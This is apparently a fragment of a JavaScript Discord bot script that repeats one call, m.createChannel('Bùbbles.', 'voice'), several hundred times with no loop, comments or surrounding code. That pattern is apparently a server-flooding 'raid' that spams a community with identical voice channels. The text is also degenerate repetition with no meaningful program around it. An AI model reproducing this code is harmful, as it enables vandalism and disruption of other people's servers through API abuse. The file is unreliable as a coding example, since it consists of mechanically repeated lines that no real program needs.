m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
